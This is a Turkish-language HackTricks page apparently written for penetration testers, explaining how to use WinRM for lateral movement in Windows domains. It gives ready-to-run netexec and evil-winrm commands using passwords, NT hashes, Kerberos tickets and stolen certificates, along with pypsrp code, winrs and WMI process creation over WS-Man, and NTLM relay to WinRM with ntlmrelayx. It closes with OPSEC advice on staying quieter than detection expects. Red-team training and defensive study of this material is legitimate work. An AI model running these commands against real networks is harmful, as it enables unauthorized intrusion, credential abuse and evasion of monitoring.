# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM, Windows ortamlarında en kullanışlı **lateral movement** taşıyıcılarından biridir; çünkü SMB servis oluşturma hilelerine ihtiyaç duymadan **WS-Man/HTTP(S)** üzerinden uzak bir shell sağlar. Hedef **5985/5986** portlarını açıyorsa ve principal’ınız remoting kullanabiliyorsa, çoğu zaman "valid creds"ten "interactive shell"e çok hızlı geçebilirsiniz.

**protocol/service enumeration**, listeners, WinRM’i etkinleştirme, `Invoke-Command` ve genel client kullanımı için şuraya bakın:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Operatörler neden WinRM’i sever

- **HTTP/HTTPS** kullanır, SMB/RPC yerine; bu yüzden PsExec tarzı execution engellendiğinde bile sıkça çalışır.
- **Kerberos** ile, yeniden kullanılabilir credentials’ı hedefe göndermeyi önler.
- **Windows**, **Linux** ve **Python** tooling (`winrs`, `evil-winrm`, `pypsrp`, `netexec`) üzerinden temiz şekilde çalışır.
- Interactive PowerShell remoting yolu, hedefte doğrulanan kullanıcı context’i altında **`wsmprovhost.exe`** başlatır; bu, service-based exec’ten operasyonel olarak farklıdır.

## Erişim modeli ve önkoşullar

Pratikte başarılı WinRM lateral movement, **üç** şeye bağlıdır:

1. Hedefte bir **WinRM listener** (`5985`/`5986`) ve erişime izin veren firewall kuralları vardır.
2. Account endpoint’e **kimlik doğrulayabilir**.
3. Account bir remoting session açmaya **yetkilidir**.

Bu erişimi elde etmenin yaygın yolları:

- Hedefte **Local Administrator** olmak.
- Yeni sistemlerde **Remote Management Users** grubuna veya hâlâ bu grubu dikkate alan sistemlerde/bileşenlerde **WinRMRemoteWMIUsers__** grubuna üyelik.
- Local security descriptors / PowerShell remoting ACL değişiklikleri üzerinden açıkça devredilmiş remoting yetkileri.

Eğer zaten admin rights ile bir box kontrol ediyorsanız, burada açıklanan teknikleri kullanarak tam admin group membership olmadan da **WinRM access** devredilebileceğini unutmayın:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Lateral movement sırasında önemli authentication ayrıntıları

- **Kerberos hostname/FQDN gerektirir**. IP ile bağlanırsanız client genellikle **NTLM/Negotiate**’a düşer.
- **workgroup** veya cross-trust edge case’lerinde, NTLM çoğu zaman ya **HTTPS** ya da client tarafında hedefin **TrustedHosts** listesine eklenmesini gerektirir.
- Workgroup içinde **local accounts** ile Negotiate kullanırken, UAC remote restrictions erişimi engelleyebilir; built-in Administrator account kullanılmadıkça veya `LocalAccountTokenFilterPolicy=1` olmadıkça.
- PowerShell remoting varsayılan olarak **`HTTP/<host>` SPN** kullanır. **`HTTP/<host>`** zaten başka bir service account’a kayıtlıysa, WinRM Kerberos `0x80090322` ile başarısız olabilir; port-qualified SPN kullanın veya o SPN’nin mevcut olduğu durumlarda **`WSMAN/<host>`**’a geçin.

Password spraying sırasında valid credentials elde ederseniz, bunların shell’e dönüşüp dönüşmediğini kontrol etmenin en hızlı yolu çoğu zaman WinRM üzerinden doğrulamaktır:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### Doğrulama ve tek atımlık execution için NetExec / CrackMapExec
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### İnteraktif shell'ler için Evil-WinRM

`evil-winrm`, Linux'tan en kullanışlı interaktif seçenek olmaya devam eder çünkü **parolaları**, **NT hash'lerini**, **Kerberos ticket'larını**, **client certificate'lerini**, dosya transferini ve in-memory PowerShell/.NET yüklemeyi destekler.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

Varsayılan **`HTTP/<host>`** SPN Kerberos başarısızlıklarına neden olduğunda, bunun yerine **`WSMAN/<host>`** ticket talep etmeyi/kullanmayı deneyin. Bu durum, sertleştirilmiş veya alışılmadık kurumsal kurulumlarda, **`HTTP/<host>`** zaten başka bir service account’a bağlı olduğunda görülür.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Bu ayrıca, özellikle genel bir `HTTP` ticket yerine **WSMAN** service ticket’ı forge ettiğiniz veya talep ettiğiniz **RBCD / S4U** abuse sonrasında da faydalıdır.

### Certificate-based authentication

WinRM ayrıca **client certificate authentication** destekler, ancak certificate hedefte bir **local account** ile map edilmiş olmalıdır. Offensive açıdan bu şu durumlarda önemlidir:

- WinRM için zaten map edilmiş geçerli bir client certificate ve private key çaldığınız/export ettiğinizde;
- bir principal için certificate almak ve ardından başka bir authentication path’e pivot etmek için **AD CS / Pass-the-Certificate** abuse ettiğinizde;
- password-based remoting’den bilerek kaçınan ortamlarda çalıştığınızda.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM, password/hash/Kerberos auth’a göre çok daha az yaygındır, ancak mevcut olduğunda **passwordless lateral movement** için, parola rotasyonundan etkilenen bir yol sağlayabilir.

### Python / automation with `pypsrp`

Bir operator shell yerine automation gerekiyorsa, `pypsrp` size Python’dan **NTLM**, **certificate auth**, **Kerberos** ve **CredSSP** desteğiyle WinRM/PSRP sağlar.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Windows-native WinRM yatay hareket

### `winrs.exe`

`winrs.exe` yerleşik gelir ve etkileşimli bir PowerShell remoting oturumu açmadan **native WinRM komut yürütmesi** istediğinizde kullanışlıdır:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Operasyonel olarak, `winrs.exe` genellikle aşağıdakine benzer bir uzak süreç zinciriyle sonuçlanır:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Bunu hatırlamaya değer çünkü service-based exec ve interactive PSRP oturumlarından farklıdır.

### `winrm.cmd` / PowerShell remoting yerine WS-Man COM

**Enter-PSSession** kullanmadan, WMI sınıflarını WS-Man üzerinden çağırarak da **WinRM transport** ile çalıştırabilirsiniz. Bu, transport'u WinRM olarak tutarken remote execution primitive'ini **WMI `Win32_Process.Create`** yapar:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Bu yaklaşım şu durumlarda kullanışlıdır:

- PowerShell logging yoğun şekilde izleniyorsa.
- Klasik bir PS remoting workflow’u yerine **WinRM transport** istiyorsanız.
- **`WSMan.Automation`** COM object etrafında custom tooling oluşturuyor veya kullanıyorsanız.

## NTLM relay to WinRM (WS-Man)

SMB relay signing nedeniyle engellendiğinde ve LDAP relay kısıtlandığında, **WS-Man/WinRM** yine de cazip bir relay hedefi olabilir. Modern `ntlmrelayx.py`, **WinRM relay servers** içerir ve **`wsman://`** veya **`winrms://`** target’larına relay yapabilir.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
İki pratik not:

- Relay, hedef **NTLM** kabul ettiğinde ve relayed principal WinRM kullanmaya yetkili olduğunda en faydalıdır.
- Yeni Impacket kodu, özellikle **`WSMANIDENTIFY: unauthenticated`** isteklerini ele alır; böylece **`Test-WSMan`** tarzı probes relay akışını bozmaz.

İlk WinRM session aldıktan sonra multi-hop kısıtlamaları için şunu kontrol edin:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC ve detection notları

- **Interactive PowerShell remoting** genellikle hedefte **`wsmprovhost.exe`** oluşturur.
- **`winrs.exe`** genellikle **`winrshost.exe`** ve ardından istenen child process’i oluşturur.
- PSRP kullanırsanız, ham `cmd.exe` yerine, **network logon** telemetry, WinRM service eventleri ve PowerShell operational/script-block logging bekleyin.
- Eğer yalnızca tek bir command gerekiyorsa, **`winrs.exe`** veya tek seferlik WinRM execution, uzun ömürlü interactive remoting session’a göre daha sessiz olabilir.
- Kerberos kullanılabiliyorsa, hem trust sorunlarını hem de garip client-side `TrustedHosts` değişikliklerini azaltmak için IP + NTLM yerine **FQDN + Kerberos** tercih edin.

## References

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
